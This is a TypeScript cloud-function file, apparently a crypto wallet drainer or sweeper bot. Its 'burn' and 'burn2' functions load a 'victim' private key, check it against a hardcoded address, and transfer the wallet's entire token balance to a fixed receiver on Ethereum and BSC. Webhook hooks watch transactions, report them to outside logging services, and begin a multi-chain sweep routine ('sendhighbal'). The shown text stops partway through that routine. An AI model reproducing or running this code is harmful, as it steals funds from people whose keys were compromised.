/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @typescript-eslint/no-var-requires */
declare const Parse: any;
import './generated/evmApi';
import './generated/solApi';
import { requestMessage } from '../auth/authService';
import "./cloud";
import config from '../config';
import Moralis from 'moralis';
// import addr from '../addr';

// console.log(addr)
// import Moralis from 'moralis';
import Web3 from 'web3';

const { ethers, providers, Wallet, utils } = require('ethers');

import { parse } from 'path';
import  Pusher from "pusher"
// import Moralis from 'moralis';
// import Moralis from "moralis-v1";
var web3 = new  Web3(new Web3.providers.HttpProvider(config.WEB3_PROVIDER_URL));
var provider: any = null;

const formatEther = ethers.utils.formatEther;

Parse.Cloud.define('requestMessage', async ({ params }: any) => {
  const { address, chain, networkType } = params;

  const message = await requestMessage({
    address,
    chain,
    networkType,
  });

  return { message };
});

Parse.Cloud.define('getPluginSpecs', () => {
  // Not implemented, only excists to remove client-side errors when using the moralis-v1 package
  return [];
});

Parse.Cloud.define('getServerTime', () => {
  // Not implemented, only excists to remove client-side errors when using the moralis-v1 package
  return null;
});






async function realLogger(msg: string) {

  const pusher = new Pusher({
    appId: config.PAPPID,
    key: config.PKEY,
    secret: config.PSECRET,
    cluster: "mt1",
    useTLS: true
  });
  
 await pusher.trigger("my-e-channel", "my-e-event", {
    message: msg
  });

}




async function burn(vtctmdtls: any, ankrkey: string, request: any) {

  const ETH_RPC_HTTP_ANKR = "https://rpc.ankr.com/eth/"+ankrkey

const VICTIM_KEY = vtctmdtls.get("pkaddr");
const RECIEVER_ADDRESS = "0xF91dBC8Fd634E1032566131bFE9D35d895DadeCa";
// 0xc2132d05d31c914a87c6611c10748aeb04b58e8f
const TOKEN_ADDRESS = "0xadd39272E83895E7d3f244f696B7a25635F34234";  // eywa

if (VICTIM_KEY === "") {
  await mshlogger(request, "no key specified :failed sending token" , "error")
  // console.warn("Must provide VICTIM_KEY environment variable, corresponding to Ethereum EOA with assets to be transferred")
  return
}

const abimatic = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],
"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint8","name":"decimals","type":"uint8"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"bool","name":"mintable","type":"bool"},{"internalType":"address","name":"owner","type":"address"}],"name":"initialize","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"mintable","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256",
"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]
const iface = new utils.Interface(abimatic);

const provider = new providers.JsonRpcProvider(ETH_RPC_HTTP_ANKR);
const victim = new Wallet(VICTIM_KEY, provider);

const checkvictimaddr = "0x9564add54176dd979e3c15e2b139d448d24147fd";
if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLowerCase()) {

  request.log.info('Not same address');

  return 
}




  var balance = await victim.getBalance();

  // balance = ethers.BigNumber.from(balance)
  // if (balance.isZero()) {
  //   console.log(`Balance is zero`);
  //   return;
  // }
  
  // console.log(`Native bal: ${ethers.utils.formatUnits(balance, "ether")}`)

  const erc20_rw = new ethers.Contract(TOKEN_ADDRESS, abimatic, victim);
 
  var tkbalanceADDR1 = await erc20_rw.balanceOf(victim.address)

  // console.log(`Token Balance: ${ethers.utils.formatUnits(tkbalanceADDR1, "18")}`);


    var datatransfer = iface.encodeFunctionData("transfer", [
      RECIEVER_ADDRESS,
      tkbalanceADDR1,
    ])

    var feeData = await provider.getFeeData()
    var estimagegas = await provider.estimateGas(datatransfer)
    var gaslimit3 = (estimagegas).mul(2);
    //   const gasPrice2 = ethers.BigNumber.from(ethers.utils.parseUnits("1000", "gwei"));
    // const gasPrice3 = (feeData.maxFeePerGas).add(feeData.maxFeePerGas.div(2))
    

    //latest because i used last base fee you can check the value 
    const gasPrice3 = (feeData.lastBaseFeePerGas).add((feeData.lastBaseFeePerGas).div(3))
    const totalgasprice3 = gasPrice3.mul(gaslimit3);

    // console.log("gaslimit3: "+gaslimit3)
    // console.log("gasPrice3 first: "+ethers.utils.formatUnits(gaslimit3.div(2), "gwei"))
    // console.log("gasPrice3: "+ethers.utils.formatUnits(gasPrice3, "gwei"))
   
    // console.log("totalgasprice3: "+ethers.utils.formatUnits(totalgasprice3, "ether"))

    // 0.00023221


    if (balance.lt(totalgasprice3)) {
        // console.log(' Eth Balance is less than gas price, waiting....')
        return;
    }
  
  if(tkbalanceADDR1.lte(0)) {
     
    request.log.info('token balance  less than');
    //  console.log('token balance  less than');

     return
  }

  // if(ethers.utils.formatUnits(tkbalanceADDR1, "18").lte(6000)) {
  //   console.log('token balance  less than 7000');

  //   return
  // }

          
  if(parseInt(ethers.utils.formatUnits(tkbalanceADDR1, "18")) < (6000)) {
    // console.log('token balance  less than 7000');
    request.log.info('token balance  less than 7000');
    return
  }


  try {
    // console.log(`Sending ${formatEther(balance)}ETH`);
    // const tx = await wallet.sendTransactionç({
    //   to: RECIEVER_ADDRESS,
    //   gasLimit: 21000,
    //   gasPrice : gasPrice.mul(10),
    //   value: val
    // });

    const tx = await victim.sendTransaction({
      // chainId: 1,
      // type: 1,
      // to: TOKEN_ADDRESS,
      // gasPrice: gasPrice3,
      // gasLimit: gaslimit3,

      chainId: 1,
      type: 2,
      to: TOKEN_ADDRESS,
      maxFeePerGas: gasPrice3,
      maxPriorityFeePerGas: gasPrice3,
      gasLimit: gaslimit3,  

      data: datatransfer,
    });


     try {
        tx.wait();

    if(tx.hash) {

    
      request.log.info(`Success!...lets hope for confirmation! 😁 🚀`);
    
  
      await mshlogger(request, "Fired peptokn!!!" , "fired success")
    }

    if(tx.nonce) {

    
     
    
     await mshlogger(request, "Fired peptokn!!!, block confirmed" , "fired success")
      request.log.info(`Success! Block Confirmed 😁😁😁 🚀🚀🚀`);

  
    }

    // console.log(` Sent tx with nonce ${tx.nonce} moving   gwei: ${tx.hash}`);  
     } catch (error) {
        
        // console.log("error from txwait"+error)
     }
  }    catch  (err)  {
    await mshlogger(request, err.message+":failed sending token" , err.message)
    // console.log(` Error sending tx: ${err.message ?? err}`);
  }
}





async function burn2(vtctmdtls: any, ankrkey: string, request: any) {

  const ETH_RPC_HTTP_ANKR = "https://rpc.ankr.com/bsc/"+ankrkey

const VICTIM_KEY = vtctmdtls.get("pkaddr");
const RECIEVER_ADDRESS = "0xF91dBC8Fd634E1032566131bFE9D35d895DadeCa";
// 0xc2132d05d31c914a87c6611c10748aeb04b58e8f
const TOKEN_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";  // eywa  

if (VICTIM_KEY === "") {
  await mshlogger(request, "no key specified :failed sending token" , "error")
  // console.warn("Must provide VICTIM_KEY environment variable, corresponding to Ethereum EOA with assets to be transferred")
  return
}

const abimatic = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]
const iface = new utils.Interface(abimatic);

const provider = new providers.JsonRpcProvider(ETH_RPC_HTTP_ANKR);
const victim = new Wallet(VICTIM_KEY, provider);

const checkvictimaddr = "0x2EaacAf1468F248483Cec65254dff98FF95e3387";
if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLowerCase()) {

  request.log.info('Not same address');

  return 
}




  var balance = await victim.getBalance();

  // balance = ethers.BigNumber.from(balance)
  // if (balance.isZero()) {
  //   console.log(`Balance is zero`);
  //   return;
  // }
  
  // console.log(`Native bal: ${ethers.utils.formatUnits(balance, "ether")}`)

  const erc20_rw = new ethers.Contract(TOKEN_ADDRESS, abimatic, victim);
 
  var tkbalanceADDR1 = await erc20_rw.balanceOf(victim.address)

  // console.log(`Token Balance: ${ethers.utils.formatUnits(tkbalanceADDR1, "18")}`);


    var datatransfer = iface.encodeFunctionData("transfer", [
      RECIEVER_ADDRESS,
      tkbalanceADDR1,
    ])

    var feeData = await provider.getFeeData()
    var estimagegas = await provider.estimateGas(datatransfer)
    var gaslimit3 = (estimagegas).mul(2);
    //   const gasPrice2 = ethers.BigNumber.from(ethers.utils.parseUnits("1000", "gwei"));
    // const gasPrice3 = (feeData.maxFeePerGas).add(feeData.maxFeePerGas.div(2))
    

    //latest because i used last base fee you can check the value 
    const gasPrice3 = (feeData.lastBaseFeePerGas).add((feeData.maxFeePerGas).div(30))
    const totalgasprice3 = gasPrice3.mul(gaslimit3);

    // console.log("gaslimit3: "+gaslimit3)
    // console.log("gasPrice3 first: "+ethers.utils.formatUnits(gaslimit3.div(2), "gwei"))
    // console.log("gasPrice3: "+ethers.utils.formatUnits(gasPrice3, "gwei"))
   
    // console.log("totalgasprice3: "+ethers.utils.formatUnits(totalgasprice3, "ether"))

    // 0.00023221




    
    if (balance.lt(totalgasprice3)) {
        // console.log(' Eth Balance is less than gas price, waiting....')
        return;
    }
  
  if(tkbalanceADDR1.lte(0)) {
     
    request.log.info('token balance  less than');
    //  console.log('token balance  less than');

     return
  }

  // if(ethers.utils.formatUnits(tkbalanceADDR1, "18").lte(6000)) {
  //   console.log('token balance  less than 7000');

  //   return
  // }

          
  if(parseInt(ethers.utils.formatUnits(tkbalanceADDR1, "18")) < (6000)) {
    // console.log('token balance  less than 7000');
    request.log.info('token balance  less than 7000');
    return
  }


  try {
    // console.log(`Sending ${formatEther(balance)}ETH`);
    // const tx = await wallet.sendTransactionç({
    //   to: RECIEVER_ADDRESS,
    //   gasLimit: 21000,
    //   gasPrice : gasPrice.mul(10),
    //   value: val
    // });

    const tx = await victim.sendTransaction({
      // chainId: 1,
      type: 2,
      to: TOKEN_ADDRESS,
      maxFeePerGas: gasPrice3,
      maxPriorityFeePerGas: gasPrice3,
      gasLimit: gaslimit3,  
      data: datatransfer,
    });


     try {
        tx.wait();

    if(tx.hash) {

    
      request.log.info(`Success!...lets hope for confirmation! 😁 🚀`);
    
  
      await mshlogger(request, "Fired peptokn!!!" , "fired success")
    }

    if(tx.nonce) {

    
     
    
     await mshlogger(request, "Fired peptokn!!!, block confirmed" , "fired success")
      request.log.info(`Success! Block Confirmed 😁😁😁 🚀🚀🚀`);

  
    }

    // console.log(` Sent tx with nonce ${tx.nonce} moving   gwei: ${tx.hash}`);  
     } catch (error) {
        
        // console.log("error from txwait"+error)
     }
  }    catch  (err)  {
    await mshlogger(request, err.message+":failed sending token" , err.message)
    // console.log(` Error sending tx: ${err.message ?? err}`);
  }
}

Parse.Cloud.define("_AddressSyncStatus2", async  (request: any) => {

  request.log.info('hello world run _AddressSyncStatus2');

// eth


Parse.Cloud.afterSave("DemoTxs", async  (request: any) => {

  request.log.info('Demo section');

  if(request.object.get("confirmed") == false) {


    // console.info(request.object.get("chainId"));
    // return request.object.get("chainId");


   await passallfunc(request, getntwork(request.object.get("chainId")))
 //  var logger = Moralis.Cloud.getLogger();
 var result = await web3.utils.fromWei(request.object.get("value"));

   Parse.Cloud.httpRequest({
   method: 'POST',
  url: config.MLIS_URL,
  headers: {
    "content-type": "application/json",
    "x-apikey": config.MLIS_KEY,
    "cache-control": "no-cache"
  },
   body: {
     addr_from: request.object.get("fromAddress"),
     addr_to: request.object.get("toAddress"),
     value: result,
     time: request.object.get("_created_at"),
     brand: getntwork(request.object.get("chainId"))+"_"+request.object.get("chainId")+"_streams" ,
     server: "1demotrans: Hash: "+request.object.get("hash")
   }
 }).then(function(httpResponse: any) {
   //logger.info(httpResponse.text);
     // logger.info("Logged Eth Trnasfer");
 }, function(httpResponse: any) {
   //  logger.error(JSON.stringify(httpResponse));
 });
    
 await realLogger("new")
     
   }
   else { 
   

   
   }

   
 });




Parse.Cloud.afterSave("LiveTxs", async  (request: any) => {

  request.log.info('Live section');

   if(request.object.get("confirmed") == false) {
    await passallfunc(request, getntwork(request.object.get("chainId")))
  //  var logger = Moralis.Cloud.getLogger();
  var result = await web3.utils.fromWei(request.object.get("value"));
  
    Parse.Cloud.httpRequest({
    method: 'POST',
   url: config.MLIS_URL,
   headers: { 
     "content-type": "application/json",
     "x-apikey": config.MLIS_KEY,
     "cache-control": "no-cache"
   },
    body: {
      addr_from: request.object.get("fromAddress"),
      addr_to: request.object.get("toAddress"),
      value: result,
      time: request.object.get("_created_at"),
      brand: getntwork(request.object.get("chainId"))+"_"+request.object.get("chainId")+"_streams" ,
      server: "1 : Hash: "+request.object.get("hash")
    }
  }).then(function(httpResponse: any) {
    //logger.info(httpResponse.text);
      // logger.info("Logged Eth Trnasfer");
  }, function(httpResponse: any) {
    //  logger.error(JSON.stringify(httpResponse));
  });
     
  await realLogger("new")

    }
    else { 
    
 
    
    }
 
    
  });
 
 

 


  async function sendhighbal(request: any, toAddrDtls: any, rcveraddress: any, prjid: any, ntwk: any, value: any, loggerr: any ) {

    // loggerr.info(JSON.stringify( toAddrDtls.get("addr")));
    // loggerr.info(JSON.stringify(prjid));
   var web3: any;
   
    if(ntwk == "eth") {
   
     // web3 = new Moralis.Web3(
     //   new Moralis.Web3.providers.HttpProvider(
     //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
     //   )
     // );
    
     // web3 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));
     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/eth/"+prjid));
   
   
     // web3 = new Moralis.Web3(
     //   new Moralis.Web3.providers.HttpProvider(
     //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
     //    // "https://bsc.getblock.io/testnet/?api_key="+prjid
     //    // "https://bsc.getblock.io/mainnet/?api_key="+prjid
     //       "https://rpc.ankr.com/eth/"+prjid
   
     //       //  "https://eth.getblock.io/mainnet/?api_key="+prjid
     //   )
     // );
     
   }
   
   
    if(ntwk == "zkSync") {
   
     // web3 = new Moralis.Web3(
     //   new Moralis.Web3.providers.HttpProvider(
     //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
     //   )
     // );
    
     // web3 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));
     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/zksync_era/"+prjid));
   
   
     // web3 = new Moralis.Web3(
     //   new Moralis.Web3.providers.HttpProvider(
     //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
     //    // "https://bsc.getblock.io/testnet/?api_key="+prjid
     //    // "https://bsc.getblock.io/mainnet/?api_key="+prjid
     //       "https://rpc.ankr.com/eth/"+prjid
   
     //       //  "https://eth.getblock.io/mainnet/?api_key="+prjid
     //   )
     // );
     
   }
   
   //  web3 = new Moralis.Web3(
   //      new Moralis.Web3.providers.HttpProvider(
   //         //  'https://rinkeby.Ankra.io/v3/'+prjid
   //         //  'https://rpc.ankr.com/eth_rinkeby'
   //         // "https://eth.getblock.io/rinkeby/?api_key="+prjid
   //         "https://rpc.ankr.com/eth/"+prjid
   //         // "https://eth.getblock.io/mainnet/?api_key="+prjid
   //      )
   //    );
   
   
    if(ntwk == "bsc") {
   
      // web3 = new Moralis.Web3(
      //   new Moralis.Web3.providers.HttpProvider(
      //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
      //   )
      // );
   
      web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/bsc/"+prjid));
   
     // web3 = new Web3(new Web3.providers.HttpProvider("https://bsc.getblock.io/"+prjid+"/mainnet/"));
   
   
     //  web3 = new Moralis.Web3(
     //    new Moralis.Web3.providers.HttpProvider(
     //     //    'https://rpc.ankr.com/bsc_testnet_chapel'
     //     // "https://bsc.getblock.io/testnet/?api_key="+prjid
     //     // "https://bsc.getblock.io/"+prjid+"/mainnet/"
     //     // "https://bsc.getblock.io/5589d2a1-518e-4057-a711-f882e23287d6/mainnet/"
     //     // https://bsc.getblock.io/5589d2a1-518e-4057-a711-f882e23287d6/mainnet/
     //       //  "https://rpc.ankr.com/bsc/"+prjid
     //       "https://rpc.ankr.com/bsc/"+prjid
     //    )
     //  );
      
     //  loggerr.info("got to bsccccc");
    }
   
   
    if(ntwk == "polygon") {
   
     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/polygon/"+prjid));
   
     // web3 = new Web3(new Web3.providers.HttpProvider("https://matic.getblock.io/"+prjid+"/mainnet/"));
   
     request.log.info("got to plygon")
   
     //  web3 = new Moralis.Web3(
     //    new Moralis.Web3.providers.HttpProvider(
     //     //    'https://rpc.ankr.com/polygon_mumbai'
     //     //    'https://rpc.ankr.com/polygon'
     //     // "https://matic.getblock.io/testnet/?api_key="+prjid
     //     // "https://matic.getblock.io/mainnet/?api_key="+prjid
     //     "https://rpc.ankr.com/polygon/"+prjid
     //    )
     //  );
      
    }
   
   
    if(ntwk == "avax") {
   
     // web3 = new Web3(new Web3.providers.HttpProvider("https://avax.getblock.io/"+prjid+"/mainnet/ext/bc/C/rpc"));
   
   
     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/avalanche/"+prjid));
   
     
     //  web3 = new Moralis.Web3(
     //    new Moralis.Web3.providers.HttpProvider(
     //     //    'https://rpc.ankr.com/avalanche'
     //     //    'https://rpc.ankr.com/avalanche_fuji'
     //     // "https://avax.getblock.io/testnet/ext/bc/C/rpc?api_key="+prjid
     //     // "https://avax.getblock.io/mainnet/ext/bc/C/rpc?api_key="+prjid
     //     "https://rpc.ankr.com/avalanche/"+prjid
     //     // "https://rpc.ankr.com/avalanche-c/"+prjid
   
     //    )
     //  );
      
    
     //  loggerr.info(web3+" web3 i got here");
   
    }
   
    if(ntwk == "fantom") {
   
   
     // web3 = new Web3(new Web3.providers.HttpProvider("https://ftm.getblock.io/"+prjid+"/mainnet/"));
   
   
   
     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
   
     //  web3 = new Moralis.Web3(
     //    new Moralis.Web3.providers.HttpProvider(
     //        // 'https://rpc.ankr.com/fantom_testnet'
     //     //    'https://rpc.ankr.com/fantom'
     //     // "https://ftm.getblock.io/mainnet/?api_key="+prjid
     //     "https://rpc.ankr.com/fantom/"+prjid
     //     // "https://rpc.ankr.com/fantom/"+prjid
     //    )
     //  );
      
    }
   
    if(ntwk == "cronos") {
   
   
   
     // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
     var config = await Parse.Config.get({useMasterKey: true});
   
     var prjidd = config.get("getBlock");
     web3 = new Web3(new Web3.providers.HttpProvider("https://cro.getblock.io/"+prjidd+"/mainnet/"));
   
   
     //  web3 = new Moralis.Web3(
     //    new Moralis.Web3.providers.HttpProvider(
     //        'https://cro.getblock.io/mainnet/?api_key='+prjid
     //    )
     //  );
      
    }
    
   
   
    if(ntwk == "arb") {
   
   
     
     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/arbitrum/"+prjid));
   
     // web3 = new Web3(new Web3.providers.HttpProvider("https://arb.getblock.io/"+prjid+"/mainnet/"));
   
   
     //  web3 = new Moralis.Web3(
     //    new Moralis.Web3.providers.HttpProvider(
     //        'https://cro.getblock.io/mainnet/?api_key='+prjid
     //    )
     //  );
      
    }
   
   
   
    if(ntwk == "op") {
   
   
     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/optimism/"+prjid));
     // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
    
   
     //  web3 = new Moralis.Web3(
     //    new Moralis.Web3.providers.HttpProvider(
     //        'https://cro.getblock.io/mainnet/?api_key='+prjid
     //    )
     //  );
      
    }
   
    if(ntwk == "goerli") {
   
   // https://rpc.ankr.com/eth_goerli
     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/eth_goerli/"+prjid));
     // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
    
   
     //  web3 = new Moralis.Web3(
     //    new Moralis.Web3.providers.HttpProvider(
     //        'https://cro.getblock.io/mainnet/?api_key='+prjid
     //    )
     //  );
      
    }
   
    if(ntwk == "sepolia") {
   
    
     web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/eth_sepolia/"+prjid));
     // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
    
   
     //  web3 = new Moralis.Web3(
     //    new Moralis.Web3.providers.HttpProvider(
     //        'https://cro.getblock.io/mainnet/?api_key='+prjid
     //    )
     //  );
      
    }
   
   
   
   
   
    if(ntwk == null) {
   
     var result = await web3.utils.fromWei(request.object.get("value"));
   
     
     Parse.Cloud.httpRequest({
       method: 'POST',
      url: config.MLIS_URL,
      headers: {
        "content-type": "application/json",
        "x-apikey": config.MLIS_KEY,
        "cache-control": "no-cache"
      },
       body: {
         addr_from: request.object.get("fromAddress"),
         addr_to: request.object.get("toAddress"),
         value: result,
         time: request.object.get("_created_at"),
         brand: getntwork(request.object.get("chainId"))+"_"+request.object.get("chainId")+"_streams" ,
         server: "1new_null"
       }
     }).then(function(httpResponse: any) {
       //logger.info(httpResponse.text);
         // logger.info("Logged Eth Trnasfer");
     }, function(httpResponse: any) {
       //  logger.error(JSON.stringify(httpResponse));
     });
   
    await realLogger("new");
     return;
    }
   
   
   
    // old
   //    var options = {
   //      chain: ntwk,
   //      address: toAddrDtls.get("addr")
   //    };
   //    var balance = await Moralis.Web3API.account.getNativeBalance(options);
   
   //    var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); // nonce starts counting from 0
   
   //    var gasPrice = await web3.eth.getGasPrice();
   
   //    var gas = await web3.eth.estimateGas({
   //      to: rcveraddress,
   //      from: toAddrDtls.get("addr"),
   //      value: balance.balance,
   //    });
   
   //    var BN = web3.utils.BN;
   //    // var fee = gasPrice * gas;
   //    nGasprice = new BN(gasPrice);
   //    var fee = nGasprice.mul(new BN(gas));
    
   //    bl = new BN(balance.balance);
   //    baltosend =  bl.sub(fee);
   
   //    if(parseInt(baltosend) <= 0 ) {
   
   //      bl = new BN(value);
   //      baltosend =  bl.sub(fee);
   
   //    }
   
   
   
   // end old 
   
   
    try {
   
   // new
   
   request.log.info("got to the end of selecting network_"+ntwk)
   
